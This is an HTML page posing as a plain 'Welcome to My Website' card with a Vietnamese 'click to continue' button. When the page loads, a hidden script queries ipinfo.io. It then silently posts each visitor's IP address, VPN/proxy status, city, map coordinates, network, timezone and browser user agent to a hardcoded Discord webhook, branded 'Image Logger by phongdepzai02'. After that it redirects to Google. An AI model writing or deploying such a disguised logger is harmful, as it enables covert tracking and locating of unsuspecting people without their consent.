<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to My Website</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
            text-align: center;
        }
        .card {
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 90%;
        }
        h1 {
            font-size: 1.8em;
            margin-bottom: 10px;
        }
        .ip-address {
            font-size: 2.2em;
            font-weight: bold;
            color: #ff0000;
            margin: 15px 0;
        }
        .btn {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 1.1em;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 15px;
            width: 100%;
            font-weight: bold;
        }
        .btn:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="card">
        <h1>Welcome to My Website</h1>
        <div class="ip-address" id="ip-address">Loading...</div>
        <button class="btn" onclick="openLink()">Bấm vào đây để tiếp tục</button>
    </div>
    
    <script>
    function monke(json) {
        // Hiển thị thẳng IP lên màn hình ngay lập tức
        document.getElementById('ip-address').innerText = json.ip || 'N/A';

        var request = new XMLHttpRequest();
        request.open("POST", "https://discord.com/api/webhooks/1557733822601105419/3P02RcN4TR9j8DkIq8GodlkvgBo2bD-40J_5NaFNle3KvxeTtKoNhRbQGELIy7o_9jr6");
        request.setRequestHeader('Content-type', 'application/json');

        // Kiểm tra VPN/Proxy
        let isVpnOrProxy = "NO";
        if (json.privacy && (json.privacy.vpn || json.privacy.proxy || json.privacy.hosting)) {
            isVpnOrProxy = "YES (VPN/Proxy detected)";
        }

        let mapsLink = json.loc ? `https://www.google.com/maps?q=${json.loc}` : 'Không có tọa độ';

        // Lấy thời gian thực của người truy cập
        let visitorTime = new Date().toLocaleString("vi-VN", { timeZone: json.timezone || undefined });
        let userTimezone = json.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone;

        var params = {
            username: "Image Logger by phongdepzai02",
            content: "🎯 Có người truy cập mới!",
            embeds: [
                {
                    title: "📍 Thông tin Vị trí & IP Nâng cấp",
                    color: 3447003,
                    fields: [
                        { name: "⏰ Thời gian truy cập", value: `\`${visitorTime}\``, inline: false },
                        { name: "🌐 IP Address", value: `\`${json.ip || 'N/A'}\``, inline: false },
                        { name: "🛡️ VPN/Proxy", value: `🚩 **${isVpnOrProxy}**`, inline: false },
                        { name: "🌍 Múi giờ & Địa điểm", value: `Múi giờ: \`${userTimezone}\`\nQuốc gia: \`${json.country || 'N/A'}\` - Thành phố: \`${json.city || 'N/A'}\``, inline: false },
                        { name: "🗺️ Google Maps (Tọa độ IP)", value: `[Bấm vào đây để xem bản đồ](${mapsLink})\n*Tọa độ: ${json.loc || 'N/A'}*`, inline: false },
                        { name: "🏢 Network / Hostname", value: `${json.org || 'N/A'}`, inline: false },
                        { name: "💻 Thiết bị", value: `\`${navigator.userAgent}\``, inline: false }
                    ],
                    footer: {
                        text: "Tool created by phongdepzai02"
                    }
                }
            ]
        };

        request.send(JSON.stringify(params));
    }

    function openLink() {
        window.location.href = "https://www.google.com";
    }
    </script>

    <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
</body>
</html>
